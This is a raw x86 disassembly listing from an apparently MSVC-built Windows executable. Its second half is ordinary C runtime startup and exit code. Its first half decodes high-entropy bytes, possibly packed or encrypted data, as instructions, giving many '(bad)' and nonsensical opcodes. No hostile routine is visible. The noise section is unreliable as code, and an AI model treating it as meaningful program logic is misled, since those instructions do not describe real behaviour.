  4224bb:	xchg   edi,eax
  4224bc:	(bad)  
  4224bd:	aad    0x24
  4224bf:	jnp    0x42244f
  4224c1:	or     al,0xc3
  4224c3:	xlat   BYTE PTR ds:[ebx]
  4224c4:	shl    edi,cl
  4224c6:	rol    DWORD PTR [esi-0x6f9dcbd5],0x69
  4224cd:	leave  
  4224ce:	mov    al,ds:0x6e204e47
  4224d3:	mov    DWORD PTR [esi-0x58],esi
  4224d6:	iret   
  4224d7:	imul   edx,DWORD PTR [eax-0x6b0aac48],0x4a322fa0
  4224e1:	mov    ebx,0x6c050c71
  4224e6:	pop    ss
  4224e7:	mov    edx,0xf442fef2
  4224ec:	adc    DWORD PTR [edx+0x52f80634],eax
  4224f2:	ret    0x2bec
  4224f5:	inc    ecx
  4224f6:	js     0x4224cc
  4224f8:	aad    0xfd
  4224fa:	jl     0x42252f
  4224fc:	cmp    al,BYTE PTR [eax+0x61]
  4224ff:	jl     0x422537
  422501:	sub    al,0xb3
  422503:	ret    
  422504:	pop    ecx
  422505:	cs pop ss
  422507:	inc    ebp
  422508:	add    esp,ebx
  42250a:	mov    eax,ds:0x6ddb9690
  42250f:	push   0x9ec993d7
  422514:	push   esi
  422515:	push   ds
  422516:	xchg   DWORD PTR [esi-0x6e42d507],edi
  42251c:	test   DWORD PTR [esi],edx
  42251e:	add    al,0xbc
  422520:	(bad)  
  422521:	aad    0xeb
  422523:	jl     0x422576
  422525:	ds cli 
  422527:	push   ss
  422528:	ins    DWORD PTR es:[edi],dx
  422529:	push   0x243062e1
  42252e:	icebp  
  42252f:	ja     0x42255a
  422531:	mov    al,ds:0x853b0dab
  422536:	into   
  422537:	pop    edi
  422538:	jmp    0xd7a1:0x9c086bad
  42253f:	lea    ebp,[ebx+0x11]
  422542:	outs   dx,BYTE PTR ds:[esi]
  422543:	or     al,0x25
  422545:	and    BYTE PTR [ebx+0x12],dl
  422548:	inc    ecx
  422549:	call   0x68ea:0x7cc67c30
  422550:	in     eax,0xe3
  422552:	pop    esi
  422553:	xchg   edx,eax
  422554:	adc    al,0x1e
  422556:	jle    0x422546
  422558:	dec    ebp
  422559:	in     al,0x3
  42255b:	test   BYTE PTR ds:0x23c399d5,al
  422561:	mov    es,ebp
  422563:	push   ss
  422564:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422565:	pop    eax
  422566:	jecxz  0x4224f1
  422568:	aaa    
  422569:	pop    edi
  42256a:	stc    
  42256b:	sub    DWORD PTR [ebp-0x775f5b5e],ecx
  422571:	leave  
  422572:	sahf   
  422573:	inc    edi
  422574:	jns    0x422590
  422576:	sbb    cl,BYTE PTR [ecx+0x3c]
  422579:	in     eax,0x33
  42257b:	push   eax
  42257c:	mov    BYTE PTR [ecx-0x5],bl
  42257f:	shl    BYTE PTR [edi-0x44068ff3],1
  422585:	or     ch,ch
  422587:	sub    BYTE PTR [esi],ch
  422589:	and    eax,0x70cf8b76
  42258e:	repz lahf 
  422590:	mov    al,ds:0xdd2f7619
  422595:	add    al,0x35
  422597:	push   ds
  422598:	lahf   
  422599:	mov    edi,0x5b78fb00
  42259e:	mov    ebx,0xdb1df02a
  4225a3:	aaa    
  4225a4:	and    eax,0x4c5aa704
  4225a9:	push   es
  4225aa:	pop    ds
  4225ab:	aaa    
  4225ac:	sbb    eax,0x6f722c6c
  4225b1:	fidivr DWORD PTR [ebx]
  4225b3:	or     BYTE PTR [ecx+edx*1],ch
  4225b6:	fisttp WORD PTR [esi]
  4225b8:	xor    DWORD PTR [ecx],esp
  4225ba:	addr16 sub edi,edx
  4225bd:	(bad)  
  4225be:	push   edi
  4225bf:	pop    esi
  4225c0:	mov    ss,WORD PTR [ebx-0x395b6431]
  4225c6:	icebp  
  4225c7:	outs   dx,DWORD PTR ds:[esi]
  4225c8:	test   DWORD PTR [ebp+esi*4-0xd],0x772e828e
  4225d0:	xchg   ebx,eax
  4225d1:	cmp    eax,0xa17c77fe
  4225d6:	dec    edx
  4225d7:	ja     0x4225ef
  4225d9:	cmc    
  4225da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4225db:	pop    edi
  4225dc:	sar    DWORD PTR [eax+0x268146ce],1
  4225e2:	les    edi,FWORD PTR [ecx+ecx*2]
  4225e5:	call   0x75b7e1be
  4225ea:	jbe    0x4225dc
  4225ec:	test   DWORD PTR [eax],ecx
  4225ee:	inc    eax
  4225ef:	sub    ch,BYTE PTR ds:0x13ba3139
  4225f5:	stos   BYTE PTR es:[edi],al
  4225f6:	sbb    al,0xbd
  4225f8:	not    BYTE PTR [ebp-0x391a89a2]
  4225fe:	xchg   bl,ah
  422600:	xchg   esi,eax
  422601:	mov    ds:0x9492d865,eax
  422606:	pusha  
  422607:	add    BYTE PTR [ebx-0x6e],0xea
  42260b:	push   ecx
  42260c:	mov    edi,0x64397f5b
  422611:	(bad)  
  422612:	sbb    al,0xa7
  422614:	mov    ah,0xaf
  422616:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  422618:	mov    eax,0x73095f62
  42261d:	push   edi
  42261e:	sub    BYTE PTR [eax],bh
  422620:	push   ss
  422621:	jmp    0xdbf8:0x37d716d9
  422628:	mov    ds:0xa2d383c4,eax
  42262d:	add    DWORD PTR [eax],esp
  42262f:	fsub   QWORD PTR [ecx-0x2486dc30]
  422635:	test   BYTE PTR ds:0xfa4ffa5b,0x1f
  42263c:	mov    DWORD PTR [edi],eax
  42263e:	mov    ch,0xb3
  422640:	dec    esp
  422641:	inc    eax
  422642:	aad    0xcb
  422644:	loope  0x4226b8
  422646:	cmp    al,0x3c
  422648:	das    
  422649:	sbb    edx,DWORD PTR [edi+edi*2]
  42264c:	xchg   esi,eax
  42264d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42264e:	jecxz  0x422635
  422650:	inc    eax
  422651:	fwait
  422652:	mov    dl,0x39
  422654:	xor    ecx,eax
  422656:	lods   al,BYTE PTR ds:[esi]
  422657:	cmp    eax,0x59bcffba
  42265c:	push   eax
  42265d:	inc    esi
  42265e:	sub    al,0x4a
  422660:	push   edx
  422661:	(bad)  
  422662:	mov    esi,0x7f241841
  422667:	loop   0x4225fe
  422669:	mov    bl,0x6d
  42266b:	inc    edx
  42266c:	pop    ebx
  42266d:	dec    esi
  42266e:	dec    edi
  42266f:	push   cs
  422670:	fcmovu st,st(3)
  422672:	dec    ebx
  422673:	je     0x42265f
  422675:	retf   
  422676:	push   es
  422677:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422678:	(bad)
  42267b:	lods   al,BYTE PTR ds:[esi]
  42267c:	rcl    BYTE PTR [edi-0x71164ce5],0x54
  422683:	mov    ebx,0xeaa99b99
  422688:	jnp    0x4226e2
  42268a:	dec    ebx
  42268b:	test   BYTE PTR ds:0x176596ab,0xc3
  422692:	cmp    ch,ch
  422694:	test   eax,0xeae98a8d
  422699:	jo     0x4226b8
  42269b:	or     al,0xf
  42269d:	cmc    
  42269e:	cmp    bl,BYTE PTR ds:0x1e01ceab
  4226a4:	das    
  4226a5:	(bad)  
  4226a6:	push   0xfffffff8
  4226a8:	jmp    0x422709
  4226aa:	test   BYTE PTR [eax],0xa4
  4226ad:	rcr    BYTE PTR [esi-0x8f5efc2],1
  4226b3:	jae    0x422640
  4226b5:	es adc edx,edi
  4226b8:	test   eax,0x6dada709
  4226bd:	outs   dx,BYTE PTR ds:[esi]
  4226be:	lods   al,BYTE PTR ds:[esi]
  4226bf:	cmp    ch,BYTE PTR [ebx+edi*8]
  4226c2:	inc    ebx
  4226c3:	stc    
  4226c4:	xor    DWORD PTR [ebx+0x8],esp
  4226c7:	ret    0xfd9b
  4226ca:	daa    
  4226cb:	mov    dh,0xa1
  4226cd:	mov    eax,0xd7875198
  4226d2:	retf   
  4226d3:	dec    eax
  4226d4:	jb     0x42265c
  4226d6:	and    bl,al
  4226d8:	ins    DWORD PTR es:[edi],dx
  4226d9:	rol    BYTE PTR ds:0x85481bfa,0xc3
  4226e0:	fwait
  4226e1:	add    edi,DWORD PTR [ebx+ebx*2+0x7b]
  4226e5:	cmp    eax,0xaef7ae8e
  4226ea:	mov    ebp,0xe27109ca
  4226ef:	int    0x69
  4226f1:	mov    al,ds:0x5d0c3bf0
  4226f6:	and    eax,0x641397a6
  4226fb:	pop    esp
  4226fc:	repz jbe 0x422726
  4226ff:	aam    0xe
  422701:	or     ecx,eax
  422703:	pop    ebx
  422704:	sbb    BYTE PTR [edx+0x22941e61],dh
  42270a:	lods   al,BYTE PTR ds:[esi]
  42270b:	inc    ecx
  42270c:	pop    eax
  42270d:	dec    esi
  42270e:	js     0x42275e
  422710:	cs fs inc eax
  422713:	lods   eax,DWORD PTR ds:[esi]
  422714:	test   al,dh
  422716:	cmc    
  422717:	mov    edx,0x6a3d257b
  42271c:	jo     0x4226e5
  42271e:	push   ss
  42271f:	dec    edx
  422720:	stos   BYTE PTR es:[edi],al
  422721:	jp     0x422796
  422723:	jns    0x422746
  422725:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422726:	xchg   ecx,eax
  422727:	mov    WORD PTR [ebp-0x5006e3f3],es
  42272d:	pop    ecx
  42272e:	je     0x422717
  422730:	jge    0x422757
  422732:	in     al,dx
  422733:	add    eax,0xe3d4099b
  422738:	(bad)
  42273b:	mov    esp,0xeda19f0e
  422740:	dec    ebx
  422741:	cmp    DWORD PTR [eax+0x100ac6b6],esp
  422747:	inc    ebx
  422748:	pop    edx
  422749:	(bad)  
  42274a:	das    
  42274b:	and    edi,edx
  42274d:	mov    eax,0xadae97e
  422752:	lods   al,BYTE PTR ds:[esi]
  422753:	jnp    0x42270b
  422755:	in     al,0xe8
  422757:	xor    esp,edi
  422759:	test   BYTE PTR ds:0x51506140,ah
  42275f:	inc    edx
  422760:	xchg   esp,eax
  422761:	inc    ebx
  422762:	and    eax,0x2fc52215
  422767:	test   DWORD PTR [esi-0x58],edi
  42276a:	push   ecx
  42276b:	xchg   ebp,eax
  42276c:	adc    DWORD PTR [ebx],edx
  42276e:	xchg   esp,eax
  42276f:	stc    
  422770:	mov    WORD PTR [edi-0x3f3a0b2b],fs
  422776:	call   0x90e9125b
  42277b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42277c:	imul   edx,DWORD PTR [eax+0x7361aced],0xffffffc0
  422783:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422784:	mov    dh,cl
  422786:	stos   DWORD PTR es:[edi],eax
  422787:	pop    esp
  422788:	xchg   BYTE PTR ss:[ebp+ebp*8+0x7a8fa7c7],cl
  422790:	mov    ss,WORD PTR [eax+0x6f16e657]
  422796:	in     al,dx
  422797:	mov    ch,0x6
  422799:	stos   BYTE PTR es:[edi],al
  42279a:	push   ebx
  42279b:	lahf   
  42279c:	outs   dx,DWORD PTR ds:[esi]
  42279d:	mov    bh,0x69
  42279f:	add    ebp,DWORD PTR [eax+edx*8-0x76]
  4227a3:	fsubp  st(4),st
  4227a5:	js     0x422824
  4227a7:	sbb    eax,0xa0af541a
  4227ac:	dec    esi
  4227ad:	xor    dh,al
  4227af:	out    dx,eax
  4227b0:	scas   al,BYTE PTR es:[edi]
  4227b1:	data16 das 
  4227b3:	xchg   esp,eax
  4227b4:	and    al,0x7a
  4227b6:	pop    edi
  4227b7:	pushf  
  4227b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4227b9:	inc    edx
  4227ba:	add    cl,BYTE PTR [ecx-0x73]
  4227bd:	push   ebx
  4227be:	stos   BYTE PTR es:[edi],al
  4227bf:	ficom  DWORD PTR [ebx+0x41]
  4227c2:	push   ebp
  4227c3:	(bad)  
  4227c4:	int3   
  4227c5:	(bad)  
  4227c6:	daa    
  4227c7:	test   eax,0x6ce0caac
  4227cc:	or     al,0x1e
  4227ce:	test   al,0xa4
  4227d0:	jp     0x4227c9
  4227d2:	sbb    DWORD PTR [edx-0x1d],edx
  4227d5:	mov    esi,0x26fdea81
  4227da:	lods   eax,DWORD PTR ds:[esi]
  4227db:	jbe    0x422799
  4227dd:	jo     0x422801
  4227df:	dec    edx
  4227e0:	sub    al,0xaa
  4227e2:	in     al,dx
  4227e3:	push   edi
  4227e4:	ja     0x422845
  4227e6:	lahf   
  4227e7:	mov    eax,ds:0x78888d01
  4227ec:	sub    ebp,esi
  4227ee:	adc    DWORD PTR [ebx-0x7354654c],ebp
  4227f4:	or     eax,0x870cfc25
  4227f9:	mov    esi,0x2132c6a9
  4227fe:	xor    ebp,esp
  422800:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422801:	pop    ebx
  422802:	and    al,0x8
  422804:	dec    eax
  422805:	(bad)  
  422806:	push   ebp
  422807:	pop    ebx
  422808:	sti    
  422809:	and    edx,DWORD PTR [ebp+0x73]
  42280c:	es pusha 
  42280e:	ja     0x4227c4
  422810:	and    al,al
  422812:	jb     0x422799
  422814:	mov    dl,0x29
  422816:	push   esp
  422817:	mov    bh,0x22
  422819:	aam    0xb3
  42281b:	pop    esp
  42281c:	mov    edi,0xd43c90d
  422821:	pop    edx
  422822:	lods   al,BYTE PTR ds:[esi]
  422823:	add    BYTE PTR [ecx],0x29
  422826:	jmp    0x42289b
  422828:	push   edi
  422829:	mov    cl,0x27
  42282b:	into   
  42282c:	add    BYTE PTR [ecx-0x64],0x3b
  422830:	in     al,0x26
  422832:	adc    DWORD PTR [ecx+0x1837fc18],0xb2c9a9b6
  42283c:	leave  
  42283d:	sbb    BYTE PTR [ebx+eax*8-0x2bf3680f],al
  422844:	cmp    dl,BYTE PTR ds:0x68607e4a
  42284a:	dec    ebx
  42284b:	push   ss
  42284c:	and    ebp,DWORD PTR [ebp-0x7398000c]
  422852:	(bad)  
  422853:	in     eax,dx
  422854:	xacquire xchg BYTE PTR [ecx-0x5f],bl
  422858:	push   eax
  422859:	cmc    
  42285a:	cld    
  42285b:	sahf   
  42285c:	adc    al,dh
  42285e:	adc    DWORD PTR [edi],esi
  422860:	aad    0x16
  422862:	mov    cl,0xee
  422864:	xor    al,BYTE PTR [ebp-0x62493cf1]
  42286a:	mov    ?,WORD PTR [ebp+0x38]
  42286d:	mov    cl,0x27
  42286f:	imul   esp,ebx,0xffffffb2
  422872:	popf   
  422873:	sbb    DWORD PTR [edi+0x32be3087],edx
  422879:	adc    BYTE PTR ds:0xb2518971,al
  42287f:	mov    esi,0xde4e3f1e
  422884:	test   DWORD PTR [edi],ebp
  422886:	mov    cl,0x89
  422888:	lock push ss
  42288a:	mov    ebx,0xab87425d
  42288f:	inc    ecx
  422890:	and    BYTE PTR [esi+0x754d6f42],cl
  422896:	ret    0x3fd9
  422899:	cmp    eax,0x21682d1d
  42289e:	imul   edi,DWORD PTR ds:0xebb0daf,0xa136ed06
  4228a8:	mov    ds:0x347443bd,eax
  4228ad:	inc    eax
  4228ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4228af:	mov    bl,0x82
  4228b1:	pop    ss
  4228b2:	and    DWORD PTR ds:0xe39b9fe,0xb26696ef
  4228bc:	outs   dx,DWORD PTR ds:[esi]
  4228bd:	shl    esp,1
  4228bf:	rcr    BYTE PTR [eax],1
  4228c1:	dec    ebx
  4228c2:	xor    ebp,DWORD PTR [esi+0x2f]
  4228c5:	mov    esp,0x9bdda216
  4228ca:	and    DWORD PTR [ebx],esi
  4228cc:	or     DWORD PTR [edi+0x572ba09b],eax
  4228d2:	cmp    al,0x98
  4228d4:	daa    
  4228d5:	int3   
  4228d6:	fsubr  DWORD PTR [ecx-0x777e8a06]
  4228dc:	jecxz  0x422928
  4228de:	add    BYTE PTR [ebx+0x181859e4],ch
  4228e4:	dec    eax
  4228e5:	xchg   ecx,eax
  4228e6:	jnp    0x4228f9
  4228e8:	cwde   
  4228e9:	cmp    ebx,DWORD PTR [esi+ebp*1]
  4228ec:	dec    esi
  4228ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4228ee:	std    
  4228ef:	inc    ebx
  4228f0:	or     edx,ebx
  4228f2:	pushf  
  4228f3:	jbe    0x422927
  4228f5:	mov    ecx,0x7673081e
  4228fa:	adc    dh,0x5a
  4228fd:	fisttp DWORD PTR [ebx-0x64]
  422900:	in     eax,dx
  422901:	fisttp QWORD PTR gs:[ebx-0x3428ca91]
  422908:	adc    cl,BYTE PTR [ebx]
  42290a:	rcr    BYTE PTR ds:0xada695f,0x8e
  422911:	movsx  eax,BYTE PTR [esi+0x10]
  422915:	xor    eax,eax
  422917:	mov    esp,ebp
  422919:	pop    ebp
  42291a:	ret    0x10
  42291d:	nop
  42291e:	nop
  42291f:	nop
  422920:	cmp    DWORD PTR ds:0x45cabc,0x1
  422927:	jne    0x42292e
  422929:	call   0x422e6c
  42292e:	push   DWORD PTR [esp+0x4]
  422932:	call   0x422cf5
  422937:	push   0xff
  42293c:	call   DWORD PTR ds:0x45c1c0
  422942:	pop    ecx
  422943:	pop    ecx
  422944:	ret    
  422945:	cmp    DWORD PTR ds:0x45cabc,0x1
  42294c:	jne    0x422953
  42294e:	call   0x422e6c
  422953:	push   DWORD PTR [esp+0x4]
  422957:	call   0x422cf5
  42295c:	push   0xff
  422961:	call   0x422b3b
  422966:	pop    ecx
  422967:	pop    ecx
  422968:	ret    
  422969:	push   0x60
  42296b:	push   0x428110
  422970:	call   0x423858
  422975:	mov    edi,0x94
  42297a:	mov    eax,edi
  42297c:	call   0x4238b0
  422981:	mov    DWORD PTR [ebp-0x18],esp
  422984:	mov    esi,esp
  422986:	mov    DWORD PTR [esi],edi
  422988:	push   esi
  422989:	call   DWORD PTR ds:0x428024
  42298f:	mov    ecx,DWORD PTR [esi+0x10]
  422992:	mov    DWORD PTR ds:0x45cac4,ecx
  422998:	mov    eax,DWORD PTR [esi+0x4]
  42299b:	mov    ds:0x45cad0,eax
  4229a0:	mov    edx,DWORD PTR [esi+0x8]
  4229a3:	mov    DWORD PTR ds:0x45cad4,edx
  4229a9:	mov    esi,DWORD PTR [esi+0xc]
  4229ac:	and    esi,0x7fff
  4229b2:	mov    DWORD PTR ds:0x45cac8,esi
  4229b8:	cmp    ecx,0x2
  4229bb:	je     0x4229c9
  4229bd:	or     esi,0x8000
  4229c3:	mov    DWORD PTR ds:0x45cac8,esi
  4229c9:	shl    eax,0x8
  4229cc:	add    eax,edx
  4229ce:	mov    ds:0x45cacc,eax
  4229d3:	xor    esi,esi
  4229d5:	push   esi
  4229d6:	mov    edi,DWORD PTR ds:0x428014
  4229dc:	call   edi
  4229de:	cmp    WORD PTR [eax],0x5a4d
  4229e3:	jne    0x422a04
  4229e5:	mov    ecx,DWORD PTR [eax+0x3c]
  4229e8:	add    ecx,eax
  4229ea:	cmp    DWORD PTR [ecx],0x4550
  4229f0:	jne    0x422a04
  4229f2:	movzx  eax,WORD PTR [ecx+0x18]
  4229f6:	cmp    eax,0x10b
  4229fb:	je     0x422a1c
  4229fd:	cmp    eax,0x20b
  422a02:	je     0x422a09
  422a04:	mov    DWORD PTR [ebp-0x1c],esi
  422a07:	jmp    0x422a30
  422a09:	cmp    DWORD PTR [ecx+0x84],0xe
  422a10:	jbe    0x422a04
  422a12:	xor    eax,eax
  422a14:	cmp    DWORD PTR [ecx+0xf8],esi
  422a1a:	jmp    0x422a2a
  422a1c:	cmp    DWORD PTR [ecx+0x74],0xe
  422a20:	jbe    0x422a04
  422a22:	xor    eax,eax
  422a24:	cmp    DWORD PTR [ecx+0xe8],esi
  422a2a:	setne  al
  422a2d:	mov    DWORD PTR [ebp-0x1c],eax
  422a30:	push   0x1
  422a32:	call   0x423807
  422a37:	pop    ecx
  422a38:	test   eax,eax
  422a3a:	jne    0x422a44
  422a3c:	push   0x1c
  422a3e:	call   0x422945
  422a43:	pop    ecx
  422a44:	call   0x42377e
  422a49:	test   eax,eax
  422a4b:	jne    0x422a55
  422a4d:	push   0x10
  422a4f:	call   0x422945
  422a54:	pop    ecx
  422a55:	call   0x423667
  422a5a:	mov    DWORD PTR [ebp-0x4],esi
  422a5d:	call   0x423469
  422a62:	test   eax,eax
  422a64:	jge    0x422a6e
  422a66:	push   0x1b
  422a68:	call   0x422920
  422a6d:	pop    ecx
  422a6e:	call   DWORD PTR ds:0x428020
  422a74:	mov    ds:0x45d274,eax
  422a79:	call   0x423347
  422a7e:	mov    ds:0x45cab4,eax
  422a83:	call   0x4232a5
  422a88:	test   eax,eax
  422a8a:	jge    0x422a94
  422a8c:	push   0x8
  422a8e:	call   0x422920
  422a93:	pop    ecx
  422a94:	call   0x423072
  422a99:	test   eax,eax
  422a9b:	jge    0x422aa5
  422a9d:	push   0x9
  422a9f:	call   0x422920
  422aa4:	pop    ecx
  422aa5:	call   0x422b7d
  422aaa:	mov    DWORD PTR [ebp-0x20],eax
  422aad:	cmp    eax,esi
  422aaf:	je     0x422ab8
  422ab1:	push   eax
  422ab2:	call   0x422920
  422ab7:	pop    ecx
  422ab8:	mov    DWORD PTR [ebp-0x38],esi
  422abb:	lea    eax,[ebp-0x64]
  422abe:	push   eax
  422abf:	call   DWORD PTR ds:0x42801c
  422ac5:	call   0x423009
  422aca:	mov    DWORD PTR [ebp-0x68],eax
  422acd:	test   BYTE PTR [ebp-0x38],0x1
  422ad1:	je     0x422ad9
  422ad3:	movzx  eax,WORD PTR [ebp-0x34]
  422ad7:	jmp    0x422adc
  422ad9:	push   0xa
  422adb:	pop    eax
  422adc:	push   eax
  422add:	push   DWORD PTR [ebp-0x68]
  422ae0:	push   esi
  422ae1:	push   esi
  422ae2:	call   edi
  422ae4:	push   eax
  422ae5:	call   0x421790
  422aea:	mov    edi,eax
  422aec:	mov    DWORD PTR [ebp-0x6c],edi
  422aef:	cmp    DWORD PTR [ebp-0x1c],esi
  422af2:	jne    0x422afa
  422af4:	push   edi
  422af5:	call   0x422cb5
  422afa:	call   0x422cd7
  422aff:	jmp    0x422b2c
  422b01:	mov    eax,DWORD PTR [ebp-0x14]
  422b04:	mov    ecx,DWORD PTR [eax]
  422b06:	mov    ecx,DWORD PTR [ecx]
  422b08:	mov    DWORD PTR [ebp-0x70],ecx
  422b0b:	push   eax
  422b0c:	push   ecx
  422b0d:	call   0x422ea5
  422b12:	pop    ecx
  422b13:	pop    ecx
  422b14:	ret    
  422b15:	mov    esp,DWORD PTR [ebp-0x18]
  422b18:	mov    edi,DWORD PTR [ebp-0x70]
  422b1b:	cmp    DWORD PTR [ebp-0x1c],0x0
  422b1f:	jne    0x422b27
  422b21:	push   edi
  422b22:	call   0x422cc6
  422b27:	call   0x422ce6
  422b2c:	or     DWORD PTR [ebp-0x4],0xffffffff
  422b30:	mov    eax,edi
  422b32:	lea    esp,[ebp-0x7c]
  422b35:	call   0x423893
  422b3a:	ret    
  422b3b:	push   0x42812c
  422b40:	call   DWORD PTR ds:0x428014
  422b46:	test   eax,eax
  422b48:	je     0x422b60
  422b4a:	push   0x42811c
  422b4f:	push   eax
  422b50:	call   DWORD PTR ds:0x428018
  422b56:	test   eax,eax
  422b58:	je     0x422b60
  422b5a:	push   DWORD PTR [esp+0x4]
  422b5e:	call   eax
  422b60:	push   DWORD PTR [esp+0x4]
  422b64:	call   DWORD PTR ds:0x428028
  422b6a:	int3   
  422b6b:	push   0x8
  422b6d:	call   0x423a1f
  422b72:	pop    ecx
  422b73:	ret    
  422b74:	push   0x8
  422b76:	call   0x42398b
  422b7b:	pop    ecx
  422b7c:	ret    
  422b7d:	mov    eax,ds:0x45d270
  422b82:	test   eax,eax
  422b84:	je     0x422b88
  422b86:	call   eax
  422b88:	push   esi
  422b89:	push   edi
  422b8a:	mov    ecx,0x42a00c
  422b8f:	mov    edi,0x42a018
  422b94:	xor    eax,eax
  422b96:	cmp    ecx,edi
  422b98:	mov    esi,ecx
  422b9a:	jae    0x422bb3
  422b9c:	test   eax,eax
  422b9e:	jne    0x422bdf
  422ba0:	mov    ecx,DWORD PTR [esi]
  422ba2:	test   ecx,ecx
  422ba4:	je     0x422ba8
  422ba6:	call   ecx
  422ba8:	add    esi,0x4
  422bab:	cmp    esi,edi
  422bad:	jb     0x422b9c
  422baf:	test   eax,eax
  422bb1:	jne    0x422bdf
  422bb3:	push   0x4236ab
  422bb8:	call   0x423b30
  422bbd:	mov    esi,0x42a000
  422bc2:	mov    eax,esi
  422bc4:	mov    edi,0x42a008
  422bc9:	cmp    eax,edi
  422bcb:	pop    ecx
  422bcc:	jae    0x422bdd
  422bce:	mov    eax,DWORD PTR [esi]
  422bd0:	test   eax,eax
  422bd2:	je     0x422bd6
  422bd4:	call   eax
  422bd6:	add    esi,0x4
  422bd9:	cmp    esi,edi
  422bdb:	jb     0x422bce
  422bdd:	xor    eax,eax
  422bdf:	pop    edi
  422be0:	pop    esi
  422be1:	ret    
  422be2:	push   ebp
  422be3:	mov    ebp,esp
  422be5:	push   esi
  422be6:	push   edi
  422be7:	push   0x8
  422be9:	call   0x423a1f
  422bee:	xor    esi,esi
  422bf0:	inc    esi
  422bf1:	cmp    DWORD PTR ds:0x45cb04,esi
  422bf7:	pop    ecx
  422bf8:	jne    0x422c0a
  422bfa:	push   DWORD PTR [ebp+0x8]
  422bfd:	call   DWORD PTR ds:0x428030
  422c03:	push   eax
  422c04:	call   DWORD PTR ds:0x42802c
  422c0a:	cmp    DWORD PTR [ebp+0xc],0x0
  422c0e:	mov    al,BYTE PTR [ebp+0x10]
  422c11:	mov    DWORD PTR ds:0x45cb00,esi
  422c17:	mov    ds:0x45cafc,al
  422c1c:	jne    0x422c70
  422c1e:	mov    ecx,DWORD PTR ds:0x45d268
  422c24:	test   ecx,ecx
  422c26:	je     0x422c51
  422c28:	mov    eax,ds:0x45d264
  422c2d:	sub    eax,0x4
  422c30:	cmp    eax,ecx
  422c32:	jmp    0x422c4a
  422c34:	mov    eax,DWORD PTR [eax]
  422c36:	test   eax,eax
  422c38:	je     0x422c3c
  422c3a:	call   eax
  422c3c:	mov    eax,ds:0x45d264
  422c41:	sub    eax,0x4
  422c44:	cmp    eax,DWORD PTR ds:0x45d268
  422c4a:	mov    ds:0x45d264,eax
  422c4f:	jae    0x422c34
  422c51:	mov    eax,0x42a01c
  422c56:	mov    esi,0x42a020
  422c5b:	cmp    eax,esi
  422c5d:	mov    edi,eax
  422c5f:	jae    0x422c70
  422c61:	mov    eax,DWORD PTR [edi]
  422c63:	test   eax,eax
  422c65:	je     0x422c69
  422c67:	call   eax
  422c69:	add    edi,0x4
  422c6c:	cmp    edi,esi
  422c6e:	jb     0x422c61
  422c70:	mov    eax,0x42a024
  422c75:	mov    esi,0x42a028
  422c7a:	cmp    eax,esi
  422c7c:	mov    edi,eax
  422c7e:	jae    0x422c8f
  422c80:	mov    eax,DWORD PTR [edi]
  422c82:	test   eax,eax
  422c84:	je     0x422c88
  422c86:	call   eax
  422c88:	add    edi,0x4
  422c8b:	cmp    edi,esi
  422c8d:	jb     0x422c80
  422c8f:	cmp    DWORD PTR [ebp+0x10],0x0
  422c93:	pop    edi
  422c94:	pop    esi
  422c95:	je     0x422ca0
  422c97:	push   0x8
  422c99:	call   0x42398b
  422c9e:	jmp    0x422cb2
  422ca0:	push   DWORD PTR [ebp+0x8]
  422ca3:	mov    DWORD PTR ds:0x45cb04,0x1
  422cad:	call   0x422b3b
  422cb2:	pop    ecx
  422cb3:	pop    ebp
  422cb4:	ret    
  422cb5:	push   0x0
  422cb7:	push   0x0
  422cb9:	push   DWORD PTR [esp+0xc]
  422cbd:	call   0x422be2
  422cc2:	add    esp,0xc
  422cc5:	ret    
  422cc6:	push   0x0
  422cc8:	push   0x1
  422cca:	push   DWORD PTR [esp+0xc]
  422cce:	call   0x422be2
  422cd3:	add    esp,0xc
  422cd6:	ret    
  422cd7:	push   0x1
  422cd9:	push   0x0
  422cdb:	push   0x0
  422cdd:	call   0x422be2
  422ce2:	add    esp,0xc
  422ce5:	ret    
  422ce6:	push   0x1
  422ce8:	push   0x1
  422cea:	push   0x0
  422cec:	call   0x422be2
  422cf1:	add    esp,0xc
  422cf4:	ret    
  422cf5:	push   ebp
  422cf6:	mov    ebp,esp
  422cf8:	sub    esp,0x10c
  422cfe:	mov    eax,ds:0x45c430
  422d03:	xor    eax,DWORD PTR [ebp+0x4]
  422d06:	mov    ecx,DWORD PTR [ebp+0x8]
  422d09:	push   ebx
  422d0a:	push   esi
  422d0b:	mov    DWORD PTR [ebp-0x4],eax
  422d0e:	xor    edx,edx
  422d10:	push   edi
  422d11:	xor    eax,eax
  422d13:	cmp    ecx,DWORD PTR [eax*8+0x45c1c8]
  422d1a:	je     0x422d22
  422d1c:	inc    eax
  422d1d:	cmp    eax,0x12
  422d20:	jb     0x422d13
  422d22:	mov    esi,eax
  422d24:	shl    esi,0x3
  422d27:	cmp    ecx,DWORD PTR [esi+0x45c1c8]
  422d2d:	jne    0x422e56
  422d33:	mov    eax,ds:0x45cabc
  422d38:	cmp    eax,0x1
  422d3b:	je     0x422e31
  422d41:	cmp    eax,edx
  422d43:	jne    0x422d52
  422d45:	cmp    DWORD PTR ds:0x45c1c4,0x1
  422d4c:	je     0x422e31
  422d52:	cmp    ecx,0xfc
  422d58:	je     0x422e56
  422d5e:	push   0x104
  422d63:	lea    eax,[ebp-0x10c]
  422d69:	push   eax
  422d6a:	push   edx
  422d6b:	mov    BYTE PTR [ebp-0x8],dl
  422d6e:	call   DWORD PTR ds:0x42803c
  422d74:	test   eax,eax
  422d76:	jne    0x422d8b
  422d78:	lea    eax,[ebp-0x10c]
  422d7e:	push   0x428484
  422d83:	push   eax
  422d84:	call   0x423c40
  422d89:	pop    ecx
  422d8a:	pop    ecx
  422d8b:	lea    eax,[ebp-0x10c]
  422d91:	push   eax
  422d92:	lea    edi,[ebp-0x10c]
  422d98:	call   0x423e70
  422d9d:	inc    eax
  422d9e:	cmp    eax,0x3c
